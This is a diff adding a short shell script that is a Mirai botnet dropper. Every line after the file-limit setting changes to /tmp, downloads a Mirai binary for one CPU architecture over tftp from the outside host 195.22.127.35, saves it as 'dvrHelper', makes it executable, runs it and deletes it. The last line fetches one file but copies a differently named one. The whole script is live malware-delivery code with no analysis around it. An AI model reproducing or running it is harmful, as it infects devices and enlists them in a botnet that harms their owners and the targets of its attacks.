@@ -1,0 +1,9 @@
+#!/bin/sh
+ulimit -n 712
+cd /tmp; tftp -r mirai.arm -g 195.22.127.35;cat mirai.arm >dvrHelper;chmod +x *;./dvrHelper; rm -rf dvrhelper
+cd /tmp; tftp -r mirai.arm7 -g 195.22.127.35;cat mirai.arm7 >dvrHelper;chmod +x *;./dvrHelper; rm -rf dvrhelper
+cd /tmp; tftp -r mirai.mips -g 195.22.127.35;cat mirai.mips >dvrHelper;chmod +x *;./dvrHelper; rm -rf dvrhelper
+cd /tmp; tftp -r mirai.mpsl -g 195.22.127.35;cat mirai.mpsl >dvrHelper;chmod +x *;./dvrHelper; rm -rf dvrhelper
+cd /tmp; tftp -r mirai.ppc -g 195.22.127.35;cat mirai.ppc >dvrHelper;chmod +x *;./dvrHelper; rm -rf dvrhelper
+cd /tmp; tftp -r mirai.sh4 -g 195.22.127.35;cat mirai.sh4 >dvrHelper;chmod +x *;./dvrHelper; rm -rf dvrhelper
+cd /tmp; tftp -r mirai.arm -g 195.22.127.35;cat mirai.arm5n >dvrHelper;chmod +x *;./dvrHelper; rm -rf dvrhelper
